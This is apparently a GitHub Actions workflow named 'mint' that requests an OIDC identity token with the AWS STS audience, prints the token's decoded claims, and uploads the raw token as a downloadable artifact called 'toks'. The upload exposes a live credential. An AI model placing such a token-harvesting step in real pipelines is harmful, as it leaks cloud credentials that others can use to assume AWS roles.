name: mint
on:
  push:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  mint:
    runs-on: ubuntu-latest
    steps:
      - name: mint
        run: |
          set -e
          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com"             | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])' > t1.txt
          python3 -c 'import json,base64;t=open("t1.txt").read().strip();p=t.split(".")[1];p+="="*(-len(p)%4);print("CLAIM",json.dumps(json.loads(base64.urlsafe_b64decode(p))))'
      - uses: actions/upload-artifact@v4
        with:
          name: toks
          path: t1.txt
